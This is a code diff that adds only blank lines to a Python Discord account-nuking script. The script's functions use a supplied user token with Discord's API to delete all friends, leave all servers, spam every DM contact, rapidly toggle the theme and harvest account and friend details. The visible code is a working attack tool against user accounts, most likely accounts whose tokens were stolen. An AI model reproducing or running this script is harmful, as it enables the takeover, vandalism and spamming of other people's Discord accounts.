@@ -30,6 +30,7 @@ def commands(Token):
         delete_all_friends(Token)
     if b == "9":
         set_status(Token)
+
 def get_token_informations(Token):
     r = requests.get("https://discord.com/api/v9/users/@me", headers=headers(Token))
     sleep(1)
@@ -42,6 +43,7 @@ def get_token_informations(Token):
     print("-"*20)
     sleep(3)
     commands(Token)
+
 def set_status(Token):
     print("-"*20)
     new_status = input(str("enter new status: "))
@@ -54,6 +56,7 @@ def set_status(Token):
     print("-"*20)
     sleep(2)
     commands(Token)
+
 def delete_all_friends(Token):
     r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers(Token))
     print("-"*20)
@@ -67,6 +70,7 @@ def delete_all_friends(Token):
     print("-"*20)
     sleep(1)
     commands(Token)
+
 def leave_all_server(Token):
     r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers(Token))
     for servers in r.json():
@@ -75,6 +79,7 @@ def leave_all_server(Token):
             print("successfully leave: ", servers["name"])
     sleep(1)
     commands(Token)
+
 def check_token(Token):
     try:
         r = requests.get("https://canary.discord.com/api/v9/applications", headers=headers(Token))
@@ -88,9 +93,11 @@ def check_token(Token):
     except:
         print("token not working")
         new_token()
+
 def rndm_string(Ammount):
     rndm__string = "".join(random.choice(string.ascii_letters) for i in range(0, Ammount))
     return rndm__string
+
 def dm_friends(Token):
     spam_text = input(str("please enter message to spam: "))
     r_dm = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers(Token)).json()
@@ -100,6 +107,7 @@ def dm_friends(Token):
         print("message send")
     sleep(2)
     commands(Token)
+
 def light_on_off(Token):
     for i in range (0, 100):
         payload = {"theme": "light"}
@@ -112,6 +120,7 @@ def light_on_off(Token):
     sleep(2)
     print("-"*20)
     commands(Token)
+
 def get_friend_information(Token):
     r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers(Token))
     jssson = r.json()
@@ -122,6 +131,7 @@ def get_friend_information(Token):
     print("-"*20)
     sleep(1)
     commands(Token)
+
 def get_joined_server(Token):
     print("-"*20)
     r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers(Token))
@@ -131,9 +141,11 @@ def get_joined_server(Token):
     print("-"*20)
     sleep(2)
     commands(Token)
+
 def new_token():
     t = input(str("please enter token: "))
     check_token(t)
+
 def nqcker(Token):
     for i in range(random.randint(4, 69)):
         data = {
@@ -143,6 +155,7 @@ def nqcker(Token):
         print(i)
         sleep(0.2)
     commands(Token)
+
 def s7art():
     yeah = """             ▄▄                                        ▄▄                                                                                                            
 ▀███▀▀▀██▄   ██                                      ▀███     ███▀▀██▀▀███        ▀███                             ▀███▄   ▀███▀          ▀███                       
